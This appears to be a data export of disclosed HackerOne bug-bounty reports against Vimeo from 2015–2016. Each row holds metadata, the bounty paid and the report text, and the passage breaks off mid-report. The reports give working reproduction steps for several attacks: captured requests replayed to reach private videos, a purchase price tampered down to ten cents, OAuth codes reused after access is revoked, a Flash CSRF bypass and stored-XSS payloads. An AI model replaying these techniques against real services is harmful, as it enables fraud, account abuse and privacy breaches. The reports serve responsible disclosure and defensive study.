Navigate to BobAlbum and click the AliceVideo. The URL will looks like, https://vimeo.com/album/3295969/video/118026546


Add a new comment and capture the request using burp proxy. Captured request looks like,
POST /118026546 HTTP/1.1
Host: vimeo.com
[...]
text=test&action=add_comment&token=...&version=...&group_id=3295969&context_id=3295969&context_type=album&add_comment=Add%20a%20new%20comment


From Alice account, make AliceVideo as private (check 'only me'->'apply to all existing videos' setting).


From Bob account, access the AliceVideo URL (https://vimeo.com/album/3295969/video/118026546) and it displays 'permssion denied' message. At this point, Bob can't view the video or leave comments. However, Bob can post comments on the private video by replaying the request captured in step 5.",https://hackerone.com/reports/50829,New York,United States,New York,2015,3,10,18,13
Vimeo,1001-5000,0.0,50m-100m,$250.00,No value,0.0,Improper Authentication - Generic,Ability to Download Music Tracks Without Paying (Missing permission check on`/musicstore/download`),"wkcaj  submitted a report to Vimeo.Jan 14th (8 years ago)Hello,
I'm not sure how serious this is to be honest. If you're downloading tracks without paying, then I'm sure you could find a copy somewhere on the internet anyway. But I guess it's still an issue.
When browsing the Music Store (https://vimeo.com/musicstore), some tracks are free. To download these, a GET request is sent to /musicstore/download, with a query string of track_id=[track_id]&license_id=4.
For non-free tracks, the link is replaced with an Add to Cart icon, and you're expected to go through the checkout procedure. This is done by a POST request to /cart/musicwith a body of action=add&license_id=2&license_name=Personal&price=1.99&track_id=110947&track_title=Remind%2BMe&uid=110947_2&&&token=[token].
Copying the track_id from the Add to Cart request and transplanting it into the /musicstore/download successfully redirects you to Amazon S3 to download the track, despite you not having paid for it.
Note: I submitted the GET request to /musicstore/download, but didn't follow the 302 redirect to S3 to download the track since I didn't pay for it. Because of this I can't 100% verify that the resulting file is the track, but judging by the URL it looks like it is.
Proof-of-Concept
Accounts Needed

User #1 - Standard Vimeo user

Steps

Login, and browse to https://vimeo.com/musicstore
Find a non-free track, and click the Add to Cart icon
Inside the POST request to /cart/music copy the track_id
Browse to the following URL, replacing [track_id] with the one from step 3. You should be redirected to S3 to download the track (without paying): https://vimeo.com/musicstore/download?track_id=[track_id]&license_id=4

If you need anymore info just shout,
Cheers,
Jack",https://hackerone.com/reports/43770,New York,United States,New York,2015,1,14,17,59
Vimeo,1001-5000,0.0,50m-100m,"$1,000.00",No value,0.0,Privilege Escalation,abusing Thumbnails(https://vimeo.com/upload/select_thumb) to see a private video,"adrianbelen  submitted a report to Vimeo.Jan 15th (8 years ago)https://vimeo.com/upload/select_thumb uri is used set a thumbnails on your vimeo video. https://vimeo.com/upload/select_thumb uri  request is compose of 3 parameter clip_id, token, and time . clip_id parameter is used to select a video you want to  get a thumbnail,clip_id is a csrf token and time parameter is the timeframe of the video you selected.!
I changed the value of clip_id parameter to another video id to test some authorization flaw ,it seem it works because i got HTTP/1.1 200 OK  and i short json response that contain a url, like this one
{""success"":true,""id"":503302458,""url"":""https:\/\/i.vimeocdn.com\/video\/503302458_100x75.jpg""}
To confirm this is a authorization flaw i make a another account and upload a private video in that account and get the clip_id, then make a request(https://vimeo.com/upload/select_thumb) to  my attacker account using that clip_id. as a result i got some thumbnails on a private video 
if you want to get the whole video just iterate the time parameter! i think it is useful to include some request 
SOME REQUEST
POST /upload/select_thumb HTTP/1.1
Host: vimeo.com
Connection: keep-alive
Content-Length: 101
Accept: application/json
Origin: https://vimeo.com
X-Requested-With: XMLHttpRequest
X-Request: JSON
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
Content-type: application/x-www-form-urlencoded; charset=UTF-8
DNT: 1
Referer: https://vimeo.com/116730756/settings
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8,et;q=0.6,fil;q=0.4
Cookie: optimizelyEndUserId=oeu1421174571879r0.30598339810967445; vimeo_cart=%7B%22pro%22%3A%7B%22store%22%3A%22pro%22%2C%22version%22%3A1%2C%22quantities%22%3A%7B%22433857%22%3A1%7D%2C%22items%22%3A%5B%7B%22id%22%3A433857%7D%5D%2C%22currency%22%3A%22USD%22%2C%22attributes%22%3A%5B%5D%7D%7D; ki_t=1421174596820%3B1421174596820%3B1421174632154%3B1%3B2; ki_r=; optimizelySegments=%7B%22198520930%22%3A%22direct%22%2C%22199004622%22%3A%22gc%22%2C%22199138489%22%3A%22false%22%2C%22213082152%22%3A%22none%22%2C%22222271074%22%3A%22true%22%7D; optimizelyBuckets=%7B%7D; language=en; clips=116730756%2C116213689; auto_load_stats=1; has_logged_in=1; stats_start_date=2015%2F01%2F11; stats_end_date=2015%2F01%2F15; site_settings=%7B%22sticky_page%22%3A%22%5C%2Fmyvideos%22%2C%22browse_format_vid%22%3A%22video%22%7D; stream_id=Y2xpcHM6MzYzNzIzODc6aWQ6ZGVzYzpbXQ%3D%3D; stream_pos=1; orphaned_upload_clip_ids_v2=%5B116730663%2C116730664%5D; vuid=971609171.1881657208; utma=18302654.1379178336.1421173781.1421184208.1421253399.5; utmb=18302654.28.9.1421253997197; utmc=18302654; utmz=18302654.1421174705.2.2.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmv=18302654.|2=user_type=basic=1^3=ms=0=1^7=video_count=0=1; vimeo=epk9krxkmr70pcdxcxxsctd7jpcdxcxmkxrx7%2Cpfftk0tftdd0fdcmvx9x92rmksckx5rrfww5dwrvv; player=""""; xsrft=d816974227fe3684c41a8501f333679f.61b1f2e5e1df9aeb29e02acf641d99a9
clip_id=9digitid&token=TOKEN_HERE&time=51.283",https://hackerone.com/reports/43850,New York,United States,New York,2015,1,15,1,33
Vimeo,1001-5000,0.0,50m-100m,"$1,000.00",No value,0.0,Violation of Secure Design Principles,Adding profile picture to anyone on Vimeo,"avlidienbrunn  submitted a report to Vimeo.Jan 13th (8 years ago)Hi!
Brief
The profile picture upload feature at https://vimeo.com/settings/profile contains a bug where an access control is missing for uploading a profile picture to a profile ID. This leads to the possibility of uploading a profile picture to any account on Vimeo. Furthermore, since the upload doesn't have any rate limiting, it would in theory be possible to add a picture to every Vimeo account that exists (since the profile IDs are incremental).
PoC

Set up an intercepting proxy so that you can edit requests/responses to Vimeo
Visit https://vimeo.com/settings/profile
Click the ""Upload"" button
Choose any image
If you did everything correct, your browser should now send a request to /upload/_get_image_url with 2 post parameters. One of them is called ""id"". Change this id to another profile id then forward the request.
Your uploaded picture is now added to the other profile!

Remediation
The profile picture upload function should only work for the currently logged in users profile ID.
Mathias",https://hackerone.com/reports/43617,New York,United States,New York,2015,1,13,21,59
Vimeo,1001-5000,0.0,50m-100m,"$1,000.00",No value,0.0,Cross-Site Request Forgery (CSRF),Make API calls on behalf of another user (CSRF protection bypass),"avlidienbrunn  submitted a report to Vimeo.Jan 17th (8 years ago)Hi!
Brief
I have discovered a way to issue API calls on behalf of other users. The problem stems from the fact that the API playground at https://developer.vimeo.com/api/playground/me has a very weak CSRF protection. The only thing protecting this resource from CSRF attacks is the demand that the ""X-Requested-With: XMLHttpRequest"" request header is present on the call.
At first sight, this seems impossible to circumvent because sending AJAX requests cross-domain is blocked by CORS, but there is a way to spoof the ""X-Requested-With"" request header in Flash.
I have only created a proof-of-concept for Safari (tested on newest version on OSX), but there is a big chance that this is possible from other browsers (and other plugins) too.
PoC

Log in to Vimeo in Safari
Visit https://s3.amazonaws.com/avlidienbrunn/vimeo_pwn.swf
Your profile biography now says ""avlidienbrunn+was+here""

Video demonstration
I have made a Video explaining the issue, but at the time of writing this I am still uploading it to Vimeo (I will put a password on it and attach it to a comment).
Technical details
It's possible to send the ""X-Requested-With"" header with Flash, but we can't send it cross-domain due to the SOP implementation with Adobe's crossdomain.xml files. However, we can trick Flash into sending the request anyway by issuing the request to a domain that does allow it, which in turn sends a HTTP 307 redirect to the resource that we want to target. Flash will send the request to the new resource before requesting crossdomain.xml on the new domain.

Safari requests https://s3.amazonaws.com/avlidienbrunn/vimeo_pwn.swf
SWF requests https://avlidienbrunn.se/crossdomain.xml
SWF requests https://avlidienbrunn.se/vimeo_pwn.php (issues 307 redirect to Vimeo API playground)
SWF requests https://developer.vimeo.com/api/playground/me (including the X-Requested-With header)
SWF requests https://developer.vimeo.com/crossdomain.xml

Since it's step #4 that issues the API call, we can make the currently logged in user issue the call regardless of the crossdomain.xml file. We can, however, not read the response from the API call.
Mathias",https://hackerone.com/reports/44146,New York,United States,New York,2015,1,17,12,20
Vimeo,1001-5000,0.0,50m-100m,$500.00,No value,0.0,Improper Authentication - Generic,API: missing invalidation of OAuth2 Authorization Code during access revocation causes authorization bypass,"dor1s  submitted a report to Vimeo.Apr 21st (8 years ago)OAuth2 API makes it possible for users to grant access to their accounts to some third-side applications. Of course, users are able to manage such applications' access to their accounts and may deny access for any application. When some user denies access for the application, all access_tokens are being revoked and become invalid. But not only access_tokens should be revoked, authorization codes (it is intermediate token used in OAuth2 Authorization Flow) must be revoked too. Vimeo OAuth2 API implementation does not revoke authorization code during access revocation. It may be exploited to restore access to user's account by malicious application after access revocation.
Proof of Concept
(all scripts used are attached)
1) Open the link for OAuth2 authorization for some application. Example link for my test application (Dor1s Test1, feel free to use my test application to reproduce the issue):
Code 183 BytesWrap lines Copy Download1https://api.vimeo.com/oauth/authorize?response_type=code&client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a&redirect_uri=https://avuln.com/callback&scope=public&state=0123456789abcdef
2) Log into your Vimeo account (if needed) and click Allow
3) Copy code value from callback url, for example:
Code 95 BytesWrap lines Copy Download1https://avuln.com/callback?state=0123456789abcdef&code=e1fa87cd449ae55b74445b31ac79450c14eeb657
code value is e1fa87cd449ae55b74445b31ac79450c14eeb657
4) Use code value to obtain access_token:
Code 253 BytesWrap lines Copy Download1doris$ ./getAccessToken.sh e1fa87cd449ae55b74445b31ac79450c14eeb657
2{
3    ""access_token"": ""d3ac3bb53d1c4ebc3de7d28e4ed801c0"",
4    ""token_type"": ""bearer"",
5    ""scope"": ""public private"",
6    ""user"": {
7        ""uri"": ""/users/39285903"",
8<... CUT OUT ... >
9}
5) Check validity of access_token:
Code 506 BytesWrap lines Copy Download1doris$ ./me.sh d3ac3bb53d1c4ebc3de7d28e4ed801c0
2HTTP/1.1 200 OK
3Date: Tue, 21 Apr 2015 14:10:29 GMT
4Server: nginx
5Content-Type: application/vnd.vimeo.user+json
6Cache-Control: no-cache, max-age=315360000
7Expires: Fri, 18 Apr 2025 14:10:29 GMT
8Content-Length: 2930
9Accept-Ranges: bytes
10Via: 1.1 varnish
11Age: 0
12X-Served-By: cache-fra1239-FRA
13X-Cache: MISS
14X-Cache-Hits: 0
15X-Timer: S1429625429.334602,VS0,VE203
16Vary: Accept,Vimeo-Client-Id,Accept-Encoding
17
18{
19    ""uri"": ""/users/39285903"",
20< ... CUT OUT ... >
21}
6) Repeat step 1. Link for my test application:
Code 183 BytesWrap lines Copy Download1https://api.vimeo.com/oauth/authorize?response_type=code&client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a&redirect_uri=https://avuln.com/callback&scope=public&state=0123456789abcdef
7) Repeat step 2. Log into your accounts (if needed) and click Allow.
Note: it is not hard to imagine an application requiring user to pass authentication one more time. Many applications do not store long-term sessions and force users to login/authorize every day or even often.
Note 2: often OAuth providers allow to use approval_prompt=auto parameter, which makes this step does not require user to click Allow again. I had not found such possibility for Vimeo API, but if it is possible, in such case malicious application just need to place on its web-site (or whenever in the Internet) something like that:
Code 211 BytesWrap lines Copy Download1<html>
2	<img src=""https://api.vimeo.com/oauth/authorize?response_type=code&client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a&redirect_uri=https://avuln.com/callback&scope=public&state=0123456789abcdef"">
3</html>
such code will ""silently"" produce new access_token value to callback each time it has been loaded by the user.
8) Copy code value from callback url and save it for future usage:
Code 95 BytesWrap lines Copy Download1https://avuln.com/callback?state=0123456789abcdef&code=82e24f835184f47cd83f249907e7bd5018bf62c9
code value is 82e24f835184f47cd83f249907e7bd5018bf62c9
9) Go to account security settings https://vimeo.com/settings/apps
10) Disconnect the application (Dor1s Test1 if my test application used) from Apps section
11) To ensure that access is denied, repeat step 5:
Code 565 BytesWrap lines Copy Download1doris$ ./me.sh d3ac3bb53d1c4ebc3de7d28e4ed801c0
2HTTP/1.1 401 Authorization Required
3Date: Tue, 21 Apr 2015 14:23:55 GMT
4Server: nginx
5Content-Type: application/vnd.vimeo.error+json
6Cache-Control: no-cache, max-age=315360000
7WWW-Authenticate: Bearer error=""invalid_token""
8Expires: Fri, 18 Apr 2025 14:23:55 GMT
9Content-Length: 53
10Accept-Ranges: bytes
11Via: 1.1 varnish
12X-Served-By: cache-fra1245-FRA
13X-Cache: MISS
14X-Cache-Hits: 0
15X-Timer: S1429626235.146346,VS0,VE105
16Vary: Accept,Vimeo-Client-Id,Accept-Encoding
17
18{
19    ""error"": ""A valid user token must be passed.""
20}
12) Use code value from step 8 and exchange it for access_token:
Code 252 BytesWrap lines Copy Download1doris$ ./getAccessToken.sh 82e24f835184f47cd83f249907e7bd5018bf62c9
2{
3    ""access_token"": ""9eabdc746910ea39c07395ee1b69a2b9"",
4    ""token_type"": ""bearer"",
5    ""scope"": ""public private"",
6    ""user"": {
7        ""uri"": ""/users/39285903"",
8<... CUT OUT ...>
9}
13) Check validity of access_token:
Code 504 BytesWrap lines Copy Download1doris$ ./me.sh 9eabdc746910ea39c07395ee1b69a2b9
2HTTP/1.1 200 OK
3Date: Tue, 21 Apr 2015 14:25:41 GMT
4Server: nginx
5Content-Type: application/vnd.vimeo.user+json
6Cache-Control: no-cache, max-age=315360000
7Expires: Fri, 18 Apr 2025 14:25:41 GMT
8Content-Length: 2930
9Accept-Ranges: bytes
10Via: 1.1 varnish
11Age: 0
12X-Served-By: cache-fra1235-FRA
13X-Cache: MISS
14X-Cache-Hits: 0
15X-Timer: S1429626341.087757,VS0,VE201
16Vary: Accept,Vimeo-Client-Id,Accept-Encoding
17
18{
19    ""uri"": ""/users/39285903"",
20<... CUT OUT ...>
21}
Impact
The vulnerability allows an malicious application to keep its access active to a victim's account even after access revocation. This is not only authorization bypass, but it also deprives a victim ability to manage access for an application.
Mitigation
For access revocation processing all authorization code issued for certain pair of user and application should be invalidated (as it currently being done for access_token values).2 attachments:F35603: getAccessToken.sh.txtF35604: me.sh.txtdashron   posted a comment. Apr 24th (8 years ago)I've been digging through the code, and it looks like we delete the authorization codes immediately when we generate an access token. 
When I try your steps (using your very curl commands, but newly created app credentials on a new user), step 12 returns a 400 error with the body
{
""error"": ""invalid_request"",
""error_description"": ""Invalid authorization code""
}.
Do you have a more-streamlined process that reproduces this error? We don't support approval_prompt=auto, so you can leave that whole section out.dor1s   posted a comment. Apr 25th (8 years ago)Hi dashron,
Thanks for the reply. Excuse me, but are you sure that while reproducing step 12 you are using code value from step 8?
I think there is no more-streamlined process. Simplified idea of the PoC is:
If an application got additional code value, it may obtain access_code even after access revocation by user.
I just repeated steps 6-13 several times and code was always valid for me. However I can record a screencast for the Proof of Concept.
It is good that you do not support approval_prompt=auto, let's ignore Note 2 on step 7.
Notice
You just said that:
Code 133 BytesWrap lines Copy Download1I've been digging through the code, and it looks like we delete the authorization codes immediately when we generate an access token.
Actually it is not exactly so. There you have Race Condition bug for exchanging code for access_token. One code value may be exchanged for several access_token values and all of them would be valid.
You can reproduce it with script attached. Please note that Race Condition is probabilistic vulnerability. It may be needed to do few attempts with PoC to reproduce it.
I did not reported Race Condition as separate bug, because there is no serious impact to security (when access is revoked, all access_token values become invalid). But such behavior violates OAuth2 RFC:
1) https://tools.ietf.org/html/rfc6749#section-4.1.2 :
Code 307 BytesWrap lines Copy Download1                        If an authorization code is used more than
2   once, the authorization server MUST deny the request and SHOULD
3   revoke (when possible) all tokens previously issued based on
4   that authorization code.  The authorization code is bound to
5   the client identifier and redirection URI.
2) https://tools.ietf.org/html/rfc6749#section-10.5 :
Code 310 BytesWrap lines Copy Download1   Authorization codes MUST be short lived and single-use.  If the
2   authorization server observes multiple attempts to exchange an
3   authorization code for an access token, the authorization server
4   SHOULD attempt to revoke all access tokens already granted based on
5   the compromised authorization code.
and sometimes Race Condition may cause some logical flaws, so it would be better to fix too.1 attachment:F36071: accessTokenRaceConditionPOC.sh.txtdashron   posted a comment. May 1st (8 years ago)Oh I see now. Somehow I misread this at first as you could exchange an auth code for an access token twice.
You believe that the ""disconnect from <app>"" flow should also wipe out all authorization codes for that app.
Adding that now.andrewp   closed the report and changed the status to Resolved. May 1st (8 years ago)This should be fixed now, thanks for such a through report!Vimeo  rewarded dor1s with a $500 bounty. May 1st (8 years ago)andrewp   requested to disclose this report. May 1st (8 years ago)  This report has been disclosed. May 31st (7 years ago)dor1s   posted a comment. Jun 24th (7 years ago)Hi Vimeo,
Thank you for listing my name in Hall of Fame at your web-site: https://vimeo.com/about/security.
Bu there is a little typo ""Max (dors1)"". May I ask you to change my name to ""Max Moroz"" there?
Thanks a lot!
--
Maxdashron   posted a comment. Jun 25th (7 years ago)Fixing it now!dor1s   posted a comment. Jun 25th (7 years ago)Awesome, thanks!",https://hackerone.com/reports/57603,New York,United States,New York,2015,4,21,14,44
Vimeo,1001-5000,0.0,50m-100m,$600.00,No value,0.0,Information Disclosure,All Vimeo Private videos disclosure via Authorization Bypass,"opnsec  submitted a report to Vimeo.May 10th (7 years ago)Hello,
There is a vulnerability in https://vimeo.com/[VIDEO_ID]?action=share that makes all Vimeo private videos available to anybody.
POC link :
http://opnsec.com/vimeo/vl/videoLeak.php?video=[VIDEO_ID]
POC requirements :

No need to be logged in Vimeo
Because of sensitivity of this, I put a password on the POC :
username : vimeo
password : aS3cr3tP4$$wrD7854123

POC instructions :

Open the POC link replacing [VIDEO_ID] by any Vimeo private video id (I believe all type of private videos are vulnerable)
Enter the username and password as per requirements 
If the Vimeo video id is correct, no matter the status of the video, the video should start playing.


Technical description :
https://vimeo.com/[VIDEO_ID]?action=share is an Ajax link used to ask Vimeo for the ""Share"" code to embed the video
Because it is Ajax, the server is only replying if the Header X-Requested-With is set to XMLHttpRequest.
If the Attacker send this request with a [VIDEO_ID] of a private video that he don't have access to, the server reply with an error message. However, this message contains the link to the config file of the private video including a token parameter s=[SECRET] which will grant the attacker access to the config file.
The config file contains all the info about the video including the actual video file links, video title, owner vimeo account, ... which means that the attacker has complete access to the video.
Example of config file with token parameter s=[SECRET] 
Code 214 BytesWrap lines Copy Download1https://player.vimeo.com/video/165266592/config?autoplay=0&byline=0&bypass_privacy=1&context=Vimeo%5CController%5CClipController.main&default_to_hd=1&portrait=0&title=0&s=bb016a22af815053eb54XXXXXXX019d8_1462989197

Vulnerability Mitigation 
To resolve this issue, the https://vimeo.com/[VIDEO_ID]?action=share server should not include the token parameter s=[SECRET] of the config file in the error response of https://vimeo.com/[VIDEO_ID]?action=shareif the user doesn't have right to access the video.
There is a good chance this vulnerability is present in other links, especially other Ajax links.
In addition, if that is possible, the https://player.vimeo.com/video/[VIDEO_ID]/config config file server should also check that the user has valid right to access the video even if he has a correct s=[SECRET] token

Here is the source code of http://opnsec.com/vimeo/vl/videoLeak.php
If you need more info or if the POC doesn't work feel free to contact me.
Regards,
Enguerran Gillier
&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;
&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;1 attachment:F92502: videoLeak.phpjayyspence7   posted a comment. May 10th (7 years ago)Thanks! This should be resolved.opnsec   posted a comment. May 10th (7 years ago)Yes, it is fixed for me.jayyspence7   closed the report and changed the status to Resolved. May 10th (7 years ago)Vimeo  rewarded opnsec with a $600 bounty. May 10th (7 years ago)Thanks for helping make Vimeo more secure :)opnsec   requested to disclose this report. Jun 29th (6 years ago)Thanks ! Could we publicly disclose this?  This report has been disclosed. Jul 29th (6 years ago)",https://hackerone.com/reports/137502,New York,United States,New York,2016,5,10,14,50
Vimeo,1001-5000,0.0,50m-100m,$100.00,No value,0.0,Cross-site Scripting (XSS) - Generic,APIs for channels allow HTML entities that may cause XSS issue,"artem  submitted a report to Vimeo.Jan 6th (8 years ago)Hello,
I found Vimeo's bug bounty program on [1]. Please find below details of a security issue I found.
First, APIs for channels [2] allow you to put HTML and javascript to name or description of a channel. For example, an attacker can use a Python script like the following to put javascript to an existing channel:
import httplib, urllib
server = ""api.vimeo.com""
endpoint = ""/channels/855545""
params = urllib.urlencode({'name': 'my channel<script>alert(document.cookie)</script>', 'description': 'bug bounty', 'privacy': 'anybody'})
headers = {""Authorization"": ""Bearer [token]"", ""Content-Type"": ""application/x-www-form-urlencoded""}
conn = httplib.HTTPSConnection(server)
conn.request(""PATCH"", endpoint, params, headers)
resp = conn.getresponse()
print resp.status, resp.reason
data = resp.read()
print data
conn.close()
I created a channel that contains javascript in description:
https://vimeo.com/channels/855545
Second, most of Vimeo's pages cut or encode HTML entities before they are printed out. For example, the page above doesn't execute the injected code. But I found at least two pages that don't encode HTML entities:
https://vimeo.com/album/create
https://vimeo.com/channels/<channel_id>/settings/videos
When you create an album you can add videos to this album (""Add videos to this Album"" select box on the page above). The select box contains channels you subscribed to or moderate. The page doesn't encode HTML entities when it builds the select box, so the code I injected to name of my channel is successfully executed on this page.
Technically this is a stored XSS vulnerability that allows to inject a javascript code on Vimeo's page. But it might be hard to exploit because an attacker needs to do the following:

make a victim subscribe to a malicious channel, or modify an existing channel a vicim has subscribed to
make a victim to open https://vimeo.com/album/create page
Both steps might be not so easy to do, but they are still possible.

I found some other APIs that allow to put HTML entities, but I have not checked all APIs. The problem may be fixed by making APIs encode or cut HTML entities, but it may probably cause some compatibility issues. Another way is to encode or cut HTML entities before channel name is printed out on the page above. This way, other Vimeo's pages need to be checked.
[1] https://bugcrowd.com/list-of-bug-bounty-programs
[2] https://developer.vimeo.com/api/endpoints/channels#/{channel_id}
Artem",https://hackerone.com/reports/42702,New York,United States,New York,2015,1,6,18,33
Vimeo,1001-5000,0.0,50m-100m,$100.00,No value,0.0,Cross-site Scripting (XSS) - Generic,Application XSS filter function Bypass may allow Multiple stored XSS,"securityidiots  submitted a report to Vimeo.Jan 18th (8 years ago)Hi,
As i analysed the application behavior and the security structure, i found out that the application is using ""Greedy XSS Regex filter"" against XSS and removes any the whole string from '<' to '>'. So i tried some basic bypass which allowed me to insert tags and other characters into the string.
Here is the the payload:
<%0crameset%20src=''> 
Now if we see the whole application is using same filter against XSS which makes this bypass to be universally working on nearly all the input fields, which means we can say an attacker can successfully bypass and enter XSS payload in database but when the string prints in the frontend there is another filter, which encode all html entities before printing.
Nice but now enough as many of the inputs could in the below condition will end up with a successful XSS exploitation.

Input under javascript.
Any string not properly encoded before printing.
JSON output with HTML headers.

I have already reported some issues in vimeo where input injected directly into javascript and do not need any html characters, another issue of JSON output with HTML headers. 
Below you can see both reports:
https://hackerone.com/reports/43934
https://hackerone.com/reports/44215
In the first screenshot you can see profile update request where i updates my profile and injected those HTML characters, in second screenshot you can see it injected in the response as stored XSS.2 attachments:F27291: 1.pngF27292: 2.pngmandatory   changed the status to Needs more info. Feb 11th (8 years ago)@securityidiots, can you provide reproduction steps for arbitrary XSS (instead of the frameset)? I've tried your example and it appears that it's being properly encoded at least on my profile page settings. securityidiots   changed the status to New. Feb 14th (8 years ago)Its already patchedandrewp   closed the report and changed the status to Resolved. Feb 26th (8 years ago)Looks like this was patched by a separate fix.securityidiots   posted a comment. Apr 29th (8 years ago)Looks Like Vimeo Resolved 3 Bugs Long Back , None Deserves For a Bounty? securityidiots   posted a comment. May 1st (8 years ago)Hi,
@naren @andrewp Vimeo have resolved the bugs and still atfer a long wait i havent received any bounty. please let me know the reason for such a long delay.
https://hackerone.com/reports/44157
https://hackerone.com/reports/44217
https://hackerone.com/reports/44239securityidiots   posted a comment. May 29th (7 years ago)@andrewp hello sleeping beauty!! time to wake upsecurityidiots   requested to disclose this report. May 29th (7 years ago)  This report has been disclosed. Jun 28th (7 years ago)Vimeo  rewarded securityidiots with a $100 bounty. Jan 19th (6 years ago)",https://hackerone.com/reports/44217,New York,United States,New York,2015,1,18,10,18
Vimeo,1001-5000,0.0,50m-100m,$260.00,No value,0.0,Privilege Escalation,Buying ondemand videos that  0.1  and sometimes for free,"defmax  submitted a report to Vimeo.Jan 13th (8 years ago)hello sir 
this is N B Sri Harsha 
I Have found an IDOR  where we can buy ondemand videos for free ( but i tested on 0.1$)
here is what you should do 
go any  ondemand video  like https://vimeo.com/ondemand/snowman
click on buy ! 
start the burp , you wil get an request  like this 
POST /store/ondemand/buy/28167 HTTP/1.1
Host: vimeo.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://vimeo.com/store/ondemand/buy/28167
Cookie: s=1; player=""""; vuid=608125766.1104376581; utma=18302654.630332069.1421183018.1421183018.1421183018.1; utmb=18302654.6.10.1421183018; utmc=18302654; utmz=18302654.1421183018.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmv=18302654.|3=ms=0=1; optimizelySegments=%7B%22198520930%22%3A%22direct%22%2C%22213082152%22%3A%22none%22%2C%22199004622%22%3A%22ff%22%2C%22222271074%22%3A%22true%22%2C%22199138489%22%3A%22false%22%7D; optimizelyEndUserId=oeu1421183048043r0.5468938191003022; optimizelyBuckets=%7B%7D; ki_t=1421183070473%3B1421183070473%3B1421183070473%3B1%3B1; ki_r=; vod_s=%7B%22start_location%22%3A%22container%22%2C%22referrer%22%3A%22https%3A%5C%2F%5C%2Fvimeo.com%5C%2Fondemand%22%2C%22id%22%3A28167%7D; xsrft=de3c4b9f52cbd04b2aa02603f77da742.0; vimeo_cart=%7B%22ondemand%22%3A%7B%22store%22%3A%22ondemand%22%2C%22version%22%3A1%2C%22quantities%22%3A%7B%22433225%22%3A1%7D%2C%22items%22%3A%5B%7B%22id%22%3A433225%7D%5D%2C%22currency%22%3A%22USD%22%2C%22attributes%22%3A%5B%5D%7D%7D; vimeo=epk9k9dxcd70pcdxccmkcmx7jpcdxccmkxkc7l5i_e%2C5apc7%2Cpkd9mv2xcx52usfx99uffrc292xrvxcs0rcwf2f22; xsrft=12a027375de9e0e4c6f3cbbc90eabc88.acd22c2a2bdf0aed2889ddb61d9e34d7
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 696
vin_WebSession_VID=5e1dba6a511e15efeb2a863ea37fec67c35c543f&vin_Transaction_nameValues_cart=%7B%22store%22%3A%22ondemand%22%2C%22version%22%3A1%2C%22quantities%22%3A%7B%22433225%22%3A1%7D%2C%22items%22%3A%5B%7B%22id%22%3A433225%7D%5D%2C%22currency%22%3A%22USD%22%2C%22attributes%22%3A%5B%5D%7D&vin_Transaction_transactionItems_0_sku=433225&vin_Transaction_transactionItems_0_name=Snow%2C+Man&vin_Transaction_transactionItems_0_price=5.99&vin_Transaction_transactionItems_0_quantity=1&vin_Transaction_transactionItems_0_taxClassification=TaxExempt&action=purchase&paypal_credit=PayPal&token=35ee3f893bc831e9c39a91003611440f.0&token=12a027375de9e0e4c6f3cbbc90eabc88.acd22c2a2bdf0aed2889ddb61d9e34d7
now change the value of  ""vin_Transaction_transactionItems_0_price"" = 0.1  ,  and click forward the request 
and pay via paypal , thats it u can watch any ondemand video for 0.1$",https://hackerone.com/reports/43602,New York,United States,New York,2015,1,13,21,20
Vimeo,1001-5000,0.0,50m-100m,$100.00,No value,0.0,Improper Authentication - Generic,Can message users without the proper authorization,"jkjkjk  submitted a report to Vimeo.Feb 2nd (8 years ago)It shouldn't be possible to send messages to users without following users:

You must be following at least one Vimeo member before you can send a private message. To get started, find a friend, family member, or someone with cool videos and click the ""Follow"" button on their profile page. 

It's possible to bypass that by just sending a POST request to /messages:
Code 508 BytesWrap lines Copy Download1POST /messages HTTP/1.1
2Host: vimeo.com
3User-Agent: [CENSORED]
4Accept: text/html, application/xml, text/xml, */*
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7X-Requested-With: XMLHttpRequest
8Content-Type: application/x-www-form-urlencoded; charset=utf-8
9Referer: https://vimeo.com/messages
10Content-Length: 141
11Cookie: [CENSORED]
12Connection: keep-alive
13Pragma: no-cache
14Cache-Control: no-cache
15
16name=Jens>&text=blaat&action=send_message&lightbox=true&user=[ANY USER ID HERE]&token=[CENSORED]
You can replace the user parameter with any random user ID and it will send the message without any issues.
Fix:
Add proper server side authorization on the /messages endpoint.",https://hackerone.com/reports/46113,New York,United States,New York,2015,2,2,12,21
Vimeo,1001-5000,0.0,50m-100m,$250.00,No value,0.0,Privilege Escalation,CRITICAL vulnerability - Insecure Direct Object Reference - Unauthorized access to `Videos` of Channel whose privacy is set to `Private`.,"coolboss  submitted a report to Vimeo.Jan 31st (8 years ago)Hello,
This time I found a IDOR(Insecure Direct Object Reference) vulnerability. It allows an attacker to get unauthorized access to Videos of Channel whose privacy is set to Only moderators and people I choose without being a member.
In simple words, we can access videos of private channel without being member of it.
Proof Of Concept:


See this channel ---> https://vimeo.com/channels/870575
When opened it will show an error --->
Private Channel Sorry, this Channel is private. You do not have permission to view this Channel.


Now, I have a video placed there. Follow the steps to get access to my video.


Go to ---> https://vimeo.com/tools/widget/montage
(Use burp proxy and intercept the request mades.)


1st request --->  https://vimeo.com/tools/widget/montage
